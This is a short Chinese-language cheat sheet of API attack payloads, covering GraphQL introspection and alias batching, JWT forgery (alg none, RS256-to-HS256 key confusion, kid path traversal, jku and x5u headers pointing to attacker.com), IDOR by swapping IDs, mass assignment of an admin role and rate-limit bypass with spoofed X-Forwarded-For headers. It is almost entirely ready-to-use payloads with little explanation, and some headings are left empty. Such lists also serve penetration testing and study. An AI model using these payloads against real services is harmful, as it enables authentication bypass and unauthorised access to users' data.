# API安全

## 1. GraphQL安全

### 内省查询

```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### 批量查询绕过速率限制

```graphql
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  user3: user(id: 3) { name }
}
```

### 绕过Mutation限制

```graphql
mutation {
  login(username: "admin", password: "admin") {
    token
  }
}
```

---

## 2. JWT安全

### None算法攻击

```json
{"alg":"none","typ":"JWT"}
{"alg":"none","typ":"JWT","payload":"..."}
```

### 密钥混淆攻击(RS256->HS256)

将RS256的公钥作为HS256的密钥

### KID注入

```json
{"alg":"HS256","typ":"JWT","kid":"../../../../../dev/null"}
```

### jku注入

```json
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/jwk.json"}
```

### X5u注入

```json
{"alg":"RS256","typ":"JWT","x5u":"http://attacker.com/cert.pem"}
```

---

## 3. IDOR漏洞

### 修改ID参数越权访问

```
/api/user/1 -> /api/user/2
/api/profile?id=1 -> /api/profile?id=2
```

### 批量赋值

```
POST /api/user
{"name":"test","role":"admin"}
```

---

## 4. 速率限制绕过

### IP轮换

### Header污染

```
X-Forwarded-For: 1.1.1.1
X-Real-IP: 1.1.1.1
```

### 长度绕过
